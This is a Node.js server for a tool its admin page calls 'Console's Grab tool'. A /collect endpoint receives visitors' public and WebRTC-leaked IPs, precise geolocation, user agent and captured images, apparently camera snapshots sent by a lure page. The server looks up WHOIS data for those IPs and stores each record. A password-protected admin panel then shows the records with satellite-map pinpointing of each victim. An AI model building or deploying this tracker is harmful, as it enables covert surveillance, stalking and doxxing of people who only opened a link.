const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const net = require('net');
const PORT = 3000;
const whois = require('whois');

// --- Directories ---
const PUBLIC_DIR = path.join(__dirname, 'public');
const IMAGE_DIR  = path.join(__dirname, 'images');
if (!fs.existsSync(IMAGE_DIR)) fs.mkdirSync(IMAGE_DIR);

const DATA_FILE = path.join(__dirname, 'data.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');
if (!fs.existsSync(CONFIG_FILE)) {
  console.error('Config file not found. Run pass.py first.');
  process.exit(1);
}
const CONFIG = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));

// --- Helper: safely serve static files ---
function serveStatic(baseDir, reqPath, res, contentType = null) {
  try {
    const decodedPath = decodeURIComponent(reqPath);
    const absPath = path.resolve(baseDir, '.' + decodedPath);
    if (!absPath.startsWith(baseDir)) {
      res.writeHead(403);
      return res.end('Forbidden');
    }
    if (!fs.existsSync(absPath) || !fs.statSync(absPath).isFile()) {
      res.writeHead(404);
      return res.end('Not found');
    }
    if (!contentType) {
      if (absPath.endsWith('.js')) contentType = 'application/javascript';
      else if (absPath.endsWith('.css')) contentType = 'text/css';
      else if (absPath.endsWith('.png')) contentType = 'image/png';
      else contentType = 'text/html';
    }
    res.writeHead(200, { 'Content-Type': contentType + '; charset=utf-8' });
    fs.createReadStream(absPath).pipe(res);
  } catch (e) {
    res.writeHead(400);
    res.end('Bad request');
  }
}

// --- Utility: IP helpers ---
function isPublicIP(ip) {
  if (net.isIP(ip) === 4) {
    return !(
      /^10\./.test(ip) ||
      /^192\.168\./.test(ip) ||
      /^172\.(1[6-9]|2\d|3[0-1])\./.test(ip) ||
      /^127\./.test(ip) ||
      /^169\.254\./.test(ip)
    );
  }
  if (net.isIP(ip) === 6) {
    const s = ip.toLowerCase();
    return !(s === '::1' || s.startsWith('fc') || s.startsWith('fd') || s.startsWith('fe80'));
  }
  return false;
}

// --- Determine which RIR to query based on IP ---
function getRIR(ip) {
  if (net.isIP(ip) === 4) {
    const octets = ip.split('.').map(Number);
    if (octets[0] >= 3 && octets[0] <= 71) return 'arin';
    if (octets[0] >= 72 && octets[0] <= 99) return 'ripe';
    if (octets[0] >= 100 && octets[0] <= 126) return 'apnic';
    if (octets[0] >= 128 && octets[0] <= 191) return 'lacnic';
    return 'afrinic';
  } else if (net.isIP(ip) === 6) {
    return 'arin';
  }
  return null;
}

// --- RIR server mapping ---
const RIR_SERVERS = {
  arin: 'whois.arin.net',
  ripe: 'whois.ripe.net',
  apnic: 'whois.apnic.net',
  lacnic: 'whois.lacnic.net',
  afrinic: 'whois.afrinic.net'
};

function runWhois(ip, cb) {
  if (!net.isIP(ip)) return cb(`Invalid IP: ${ip}`);

  const rir = getRIR(ip);
  const server = RIR_SERVERS[rir];

  whois.lookup(ip, { server }, (err, data) => {
    if (err) return cb(`WHOIS error: ${err.message}`);
    cb(data || 'No WHOIS data found');
  });
}


// --- IP label for HTML ---
function ipLabel(ip, type) {
  const version = net.isIP(ip) === 4 ? 'IPv4' : 'IPv6';
  if (isPublicIP(ip)) {
    return `<span style="color:#0ff;">[PUBLIC ${type} ${version}]</span> <span style="color:#0f0;">${ip}</span>`;
  } else {
    return `<span style="color:#ff0;">[LOCAL ${type} ${version}]</span> <span style="color:#0f0;">${ip}</span>`;
  }
}

// --- Save record ---
function saveRecord(record) {
  let arr = [];
  if (fs.existsSync(DATA_FILE)) {
    try {
      const raw = fs.readFileSync(DATA_FILE, 'utf8');
      arr = raw.trim() ? JSON.parse(raw) : [];
    } catch (e) { arr = []; }
  }
  arr.push(record);
  fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
}

// --- Server ---
const server = http.createServer((req, res) => {
  let clientIP = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace(/^::ffff:/,'');

  if (req.url.startsWith('/images/')) {
    return serveStatic(IMAGE_DIR, req.url.replace('/images',''), res, 'image/png');
  }

  if (req.url === '/' || req.url === '/user.html') {
    return serveStatic(PUBLIC_DIR, '/user.html', res, 'text/html');
  }

  if (req.url === '/collect' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        let record = {
          timestamp: new Date().toISOString(),
          serverObservedIP: clientIP,
          externalPublicIP: data.publicIP || null,
          webrtcIPs: data.webrtcIPs || [],
          geolocation: data.geolocation || null,
          userAgent: data.userAgent || '',
          whois: {},
          images: [],
          saved: false
        };

        if (data.images?.length) {
          data.images.forEach(img => {
            if (!img) return;
            const imgName = `capture_${Date.now()}_${Math.floor(Math.random()*9999)}.png`;
            fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(img, 'base64'));
            record.images.push(imgName);
          });
        }

        const ips = [];
        if (record.externalPublicIP && isPublicIP(record.externalPublicIP)) ips.push(record.externalPublicIP);
        record.webrtcIPs.forEach(ip => { if (isPublicIP(ip)) ips.push(ip); });

        const finalize = () => {
          if (!record.saved) {
            record.saved = true;
            saveRecord(record);
            res.writeHead(200, {'Content-Type':'application/json'});
            res.end(JSON.stringify({status:'ok'}));
          }
        };

        if (ips.length === 0) finalize();
        else {
          let pending = ips.length;
          ips.forEach(ip => {
            runWhois(ip, out => {
              record.whois[ip] = out;
              pending--;
              if (pending === 0) finalize();
            });
          });
          setTimeout(finalize, 5000);
        }

      } catch (e) {
        res.writeHead(400);
        res.end('bad json');
      }
    });
    return;
  }

  if (req.url === '/admin') {
    if (!['127.0.0.1','::1'].includes(clientIP)) {
      res.writeHead(403);
      return res.end('Forbidden: admin only accessible from localhost');
    }

    const auth = req.headers['authorization'] || '';
    if (!auth.startsWith('Basic ')) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Auth required');
    }

    const creds = Buffer.from(auth.split(' ')[1], 'base64').toString().split(':');
    if (creds.length < 2) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Invalid credentials');
    }

    const [inputUser, inputPass] = creds;
    const [salt, key] = CONFIG.adminHash.split(':');
    const hash = crypto.scryptSync(inputPass, salt, 64).toString('hex');
    const valid = crypto.timingSafeEqual(Buffer.from(hash,'hex'), Buffer.from(key,'hex'));

    if (inputUser !== CONFIG.adminUser || !valid) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Invalid credentials');
    }

    let dataArr = [];
    if (fs.existsSync(DATA_FILE)) {
      try { dataArr = JSON.parse(fs.readFileSync(DATA_FILE,'utf8')); } 
      catch(e) { dataArr = []; }
    }
    dataArr = dataArr.slice(-20);

    let out = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin</title>
      <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
      <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
      <style>
        body{background:#000;color:#0f0;font-family:monospace;text-align:center;margin:0;padding:0 10px;}
        .record{border:2px solid #0f0;margin:10px auto;padding:15px;width:100%;max-width:1200px;border-radius:5px;text-align:left;box-sizing:border-box;}
        .record h2{color:#0f0;font-size:1.8em;margin-bottom:5px;}
        .label{color:#7fff7f; font-weight:bold;}
        .prebox{background:#010;color:#0f0;padding:5px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;max-height:200px;border:1px solid #0f0;border-radius:3px;}
        .prebox.whois{max-height:270px;}
        .carousel{position:relative; display:flex; flex-direction:column; align-items:center; margin-top:5px;}
        .carousel img{max-width:80%; max-height:400px; display:none; border-radius:5px;}
        .carousel .counter{color:#0ff; margin-top:5px; font-size:0.9em;}
        .carousel .controls{margin-top:5px;}
        .carousel button{background:#000; color:#0f0; border:1px solid #0f0; border-radius:3px; padding:5px 10px; cursor:pointer; margin:0 5px;}
        .carousel button:hover{background:#0f0;color:#000;}
        a.geo{color:#0ff;cursor:pointer;text-decoration:underline;}
        @media(max-width:600px){.record{padding:10px;}}
      </style>
    </head><body><h1 style="color:#0f0;">Console's Grab tool</h1>`;

    dataArr.forEach((rec,i)=>{
      out += `<div class="record"><h2>Record ${i+1} (${rec.timestamp})</h2>`;
      out += `<span class="label" style="color:#ff0;">Server Connection IP:</span> <span style="color:#0f0;">${rec.serverObservedIP}</span><br>`;
      out += `<span class="label" style="color:#0ff;">Public WAN IP:</span> <span style="color:#0f0;">${rec.externalPublicIP || 'N/A'}</span><br>`;
      out += `<span class="label">User-Agent:</span> <pre class="prebox">${rec.userAgent}</pre>`;

      if (rec.geolocation) {
        const lat = rec.geolocation.lat;
        const lon = rec.geolocation.lng;
        const acc = rec.geolocation.acc || 50;
        out += `<span class="label">Geolocation:</span> 
                <a href="#" class="geo-link" data-lat="${lat}" data-lon="${lon}" data-acc="${acc}">${lat}, ${lon} (±${acc}m)</a><br>`;
      }

      if (rec.webrtcIPs?.length) {
        out += `<span class="label">WebRTC Discovered:</span> <pre class="prebox">`;
        rec.webrtcIPs.forEach(ip=>{ out += ipLabel(ip,"WebRTC") + "\n"; });
        out += `</pre>`;
      }

      if (rec.images?.length) {
        if (rec.images.length === 1) {
          out += `<span class="label">Captured Image:</span><br><img src="/images/${rec.images[0]}"><br>`;
        } else {
          out += `<span class="label">Captured Images:</span><br>
          <div class="carousel" id="carousel${i}">
            ${rec.images.map((img,j)=>`<img src="/images/${img}" style="display:${j===0?'block':'none'};">`).join('')}
            <div class="counter" id="counter${i}">1/${rec.images.length}</div>
            <div class="controls">
              <button class="prev">◀</button>
              <button class="play">▶</button>
              <button class="next">▶</button>
            </div>
          </div>`;
        }
      }

      if (rec.whois) {
        for (let [ip,w] of Object.entries(rec.whois)) {
          let preview = w.length>1000?w.slice(0,1000)+"\n[truncated]":w;
          out += `<h3 style="color:#0f0;">WHOIS for ${ip}</h3>`;
          out += `<pre class="prebox whois">${preview}</pre>`;
        }
      }

      out += `</div>`;
    });

    out += `<script>
      function setupCarousel(carouselId, interval = 150) {
        const carousel = document.getElementById(carouselId);
        if (!carousel) return;
        const imgs = carousel.querySelectorAll('img');
        const counter = carousel.querySelector('.counter');
        const btnPrev = carousel.querySelector('.prev');
        const btnNext = carousel.querySelector('.next');
        const btnPlay = carousel.querySelector('.play');
        let idx = 0, timer = null, playing = false;

        function show(index) {
          imgs.forEach((img,i)=>img.style.display=i===index?'block':'none');
          counter.textContent = (index+1)+'/'+imgs.length;
        }
        function next(){ idx=(idx+1)%imgs.length; show(idx); }
        function prev(){ idx=(idx-1+imgs.length)%imgs.length; show(idx); }

        btnNext.addEventListener('click',()=>{ next(); pause(); });
        btnPrev.addEventListener('click',()=>{ prev(); pause(); });
        function play(){ if(playing) return; playing=true; btnPlay.textContent='■'; timer=setInterval(next, interval); }
        function pause(){ if(!playing) return; playing=false; btnPlay.textContent='▶'; clearInterval(timer); }
        btnPlay.addEventListener('click',()=>playing?pause():play());
        show(idx);
      }
      document.querySelectorAll('.carousel').forEach(c=>setupCarousel(c.id,150));

      const modal=document.createElement('div');
      modal.id='mapModal';
      modal.style.cssText='display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000;justify-content:center;align-items:center;';
      const container=document.createElement('div');
      container.style.cssText='position:relative;width:95vw;max-width:95vh;height:95vw;max-height:95vh;background:#fff;border-radius:5px;display:flex;flex-direction:column;';
      const closeBtn=document.createElement('span');
      closeBtn.innerHTML='&times;';
      closeBtn.style.cssText='position:absolute;top:5px;right:10px;cursor:pointer;font-size:25px;font-weight:bold;color:#000;z-index:1001;';
      const mapDiv=document.createElement('div');
      mapDiv.id='popupMap';
      mapDiv.style.cssText='width:100%; height:100%; border-radius:5px;';
      container.appendChild(closeBtn);
      container.appendChild(mapDiv);
      modal.appendChild(container);
      document.body.appendChild(modal);

      document.querySelectorAll('.geo-link').forEach(link=>{
        link.addEventListener('click', e=>{
          e.preventDefault();
          const lat = parseFloat(link.dataset.lat);
          const lon = parseFloat(link.dataset.lon);
          const acc = parseFloat(link.dataset.acc);

          modal.style.display = 'flex';
          if(window.mapInstance) window.mapInstance.remove();

          window.mapInstance = L.map('popupMap').setView([lat, lon], 15);

          const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: 'Tiles © Esri', maxZoom: 19 });
          const cartoDark = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OSM &copy; CARTO', subdomains: 'abcd', maxZoom: 19 });

          satellite.addTo(window.mapInstance);

          const marker = L.marker([lat, lon], { zIndexOffset: 1000 }).addTo(window.mapInstance);
          const circle = L.circle([lat, lon], { color:'red', fillColor:'#f03', fillOpacity:0.2, radius:acc }).addTo(window.mapInstance);
          window.mapInstance.fitBounds(circle.getBounds());

          const baseMaps = { "Satellite": satellite, "Carto Dark": cartoDark };
          L.control.layers(baseMaps, {}, { collapsed: false }).addTo(window.mapInstance);

          window.mapInstance.on('baselayerchange', e=>{
            if(e.name==='Carto Dark'){
              cartoDark.addTo(window.mapInstance);
              cartoDark.getContainer().style.filter='brightness(1.75) contrast(1)';
            } else {
              if(cartoDark._map) window.mapInstance.removeLayer(cartoDark);
            }
          });
        });
      });

      closeBtn.addEventListener('click',()=>modal.style.display='none');
      modal.addEventListener('click',e=>{if(e.target===modal) modal.style.display='none';});
      window.addEventListener('resize',()=>{if(window.mapInstance) window.mapInstance.invalidateSize();});
    </script>`;

    out += '</body></html>';
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(out);
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://localhost:${PORT}/`);
});
